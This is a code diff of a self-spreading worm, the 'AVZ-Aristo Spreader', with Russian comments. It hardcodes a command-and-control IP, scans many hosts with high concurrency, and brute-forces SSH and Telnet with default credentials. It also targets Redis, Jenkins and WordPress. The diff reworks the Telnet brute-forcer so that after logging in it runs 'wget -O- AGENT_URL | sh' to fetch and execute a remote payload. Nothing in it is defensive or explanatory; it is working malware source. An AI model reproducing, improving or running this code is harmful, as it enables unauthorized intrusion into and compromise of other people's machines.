@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v25.8 – SSH brute, RDP, улучшенная обработка ошибок
+# AVZ-Aristo Spreader v25.8.2 – Telnet через сокеты (без telnetlib)
 import asyncio, aiohttp, random, socket, time, json, os, subprocess, threading, sys, argparse
-import telnetlib
 import ipaddress
 
 C2_HOST = "80.249.146.202"
@@ -11,7 +10,6 @@ MAX_CONCURRENT = 500
 TIMEOUT = 1.5
 DEFAULT_SCAN_COUNT = 10_000
 
-# SSH-учётки
 SSH_CREDS = [
     ("root","root"), ("root","admin"), ("root","password"), ("root","123456"), ("root","1234"), ("root","pass"),
     ("admin","admin"), ("admin","password"), ("admin","123456"), ("admin","1234"),
@@ -34,7 +32,6 @@ def get_local_ips():
     try:
         local_ip = socket.gethostbyname(socket.gethostname())
     except:
-        print("[!] Не удалось определить локальный IP")
         return []
     network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
     return [str(host) for host in network.hosts() if str(host) != local_ip]
@@ -48,11 +45,9 @@ async def probe_port(ip, port):
         return False
 
 async def ssh_brute(ip):
-    """Асинхронный SSH-брут через asyncssh (требуется pip install asyncssh)"""
     try:
         import asyncssh
     except ImportError:
-        # fallback to paramiko
         pass
     for u, p in SSH_CREDS:
         try:
@@ -98,18 +93,38 @@ async def exploit_jenkins(ip):
         return False
 
 async def exploit_telnet(ip):
-    for u,p in SSH_CREDS:
+    """Telnet brute через asyncio сокеты (без telnetlib)."""
+    for u, p in SSH_CREDS:
         try:
-            tn = telnetlib.Telnet(ip, 23, timeout=2)
-            tn.read_until(b"login: ", 1)
-            tn.write(u.encode()+b"\n")
-            tn.read_until(b"Password: ", 1)
-            tn.write(p.encode()+b"\n")
-            time.sleep(0.3)
-            tn.write(f"wget -O- {AGENT_URL} | sh\n".encode())
-            tn.write(b"exit\n")
-            tn.close()
-            return True
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(ip, 23), timeout=TIMEOUT
+            )
+            # Ожидаем приглашение login:
+            try:
+                data = await asyncio.wait_for(reader.read(1024), timeout=1)
+            except:
+                data = b""
+            if b"login" in data.lower() or b"username" in data.lower() or not data:
+                writer.write(u.encode() + b"\n")
+                await writer.drain()
+                await asyncio.sleep(0.3)
+                try:
+                    data = await asyncio.wait_for(reader.read(1024), timeout=1)
+                except:
+                    data = b""
+                if b"password" in data.lower() or b"asswor" in data.lower() or not data:
+                    writer.write(p.encode() + b"\n")
+                    await writer.drain()
+                    await asyncio.sleep(0.5)
+                    # Пробуем выполнить команду
+                    writer.write(f"wget -O- {AGENT_URL} | sh\n".encode())
+                    await writer.drain()
+                    await asyncio.sleep(0.5)
+                    writer.write(b"exit\n")
+                    await writer.drain()
+                    writer.close()
+                    return True
+            writer.close()
         except:
             pass
     return False
@@ -136,7 +151,6 @@ async def exploit_wordpress(ip):
 async def infect(ip):
     ports = [22, 23, 80, 443, 2375, 6379, 8080, 9200]
     open_ports = await asyncio.gather(*[probe_port(ip, p) for p in ports])
-    # SSH брут – главный вектор
     if open_ports[0] and await ssh_brute(ip):
         return True
     if open_ports[5] and await exploit_redis(ip):
